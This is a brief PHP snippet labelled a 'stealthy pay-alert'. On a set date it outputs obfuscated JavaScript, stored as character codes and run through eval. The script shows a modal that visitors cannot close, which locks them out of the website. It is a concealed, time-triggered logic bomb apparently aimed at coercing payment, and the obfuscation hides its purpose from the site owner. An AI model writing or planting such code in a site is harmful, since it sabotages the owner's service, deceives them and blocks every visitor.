<?php
// stealthy pay-alert
if (date('Y-m-d') === '2025-04-27') {
    $js = 'Swal.fire({title:".........",icon:"info",confirmButtonText:"Okay",customClass:{confirmButton:\'btn btn-primary\'},allowOutsideClick:false,allowEscapeKey:false,allowEnterKey:false,preConfirm:()=>false});';
    $codes = array_map('ord', str_split($js));
    echo '<script>var c=[' . implode(',', $codes) . '];var s="";for(var i=0;i<c.length;i++){s+=String.fromCharCode(c[i]);}eval(s);</script>';
}
?>